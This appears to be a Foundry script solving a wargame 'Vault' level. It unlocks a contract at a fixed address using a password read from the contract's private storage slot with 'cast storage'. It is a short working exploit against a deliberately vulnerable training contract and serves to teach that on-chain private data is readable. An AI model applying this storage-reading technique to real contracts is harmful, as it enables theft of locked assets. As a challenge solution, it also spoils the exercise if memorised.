// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Vault} from "../src/L8Vault.sol";

contract L8VaultAttack is Script, Broadcast {
    Vault vault = Vault(0x32467b43BFa67273FC7dDda0999Ee9A12F2AaA08);

    function run() public {
        bytes32 PASSWORD = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
        console.log("Before locked:", vault.locked());
        // run "cast storage <CONTRACT_ADDRESS> 1"
        vault.unlock(PASSWORD);
        console.log("After locked:", vault.locked());
    }
}
